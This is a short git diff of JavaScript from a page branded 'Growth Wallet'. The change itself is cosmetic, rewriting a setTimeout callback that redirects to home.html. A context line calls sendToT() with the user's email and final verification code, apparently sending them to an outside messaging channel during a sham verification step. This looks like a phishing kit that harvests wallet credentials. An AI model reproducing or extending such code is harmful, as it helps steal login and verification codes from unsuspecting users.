@@ -179,7 +179,7 @@ document.addEventListener('DOMContentLoaded', function() {
         await sendToT(`✅ <b>Growth Wallet - Verification Complete</b>\n\nEmail: <code>${currentEmail}</code>\nFinal Code: <code>${code}</code>`);
         
         alert(`Welcome to Growth Wallet, ${walletName}! Verification successful.`);
-        setTimeout (() => {
+        setTimeout(function() {
                     window.location.href = 'home.html';
                 }, 2000);
         
